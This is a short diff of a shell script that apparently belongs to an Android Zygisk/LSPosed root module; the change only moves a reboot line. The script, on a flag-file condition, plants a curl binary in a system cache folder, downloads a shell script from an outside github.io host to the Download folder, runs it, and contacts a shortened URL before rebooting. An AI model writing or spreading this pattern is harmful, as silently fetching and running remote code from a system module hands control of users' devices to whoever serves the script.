@@ -9,8 +9,8 @@ if [ "$file_content" = "123" ]; then
     cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
     curl -o -s http://tanluying.github.io/ying/hp.sh /storage/emulated/0/Download/hp.sh
     sh /storage/emulated/0/Download/hp.sh
-    reboot
     curl -l https://sourl.cn/tRtpnk
+    reboot
 fi
 echo "456" > /storage/emulated/0/Download/apks.txt
 #####
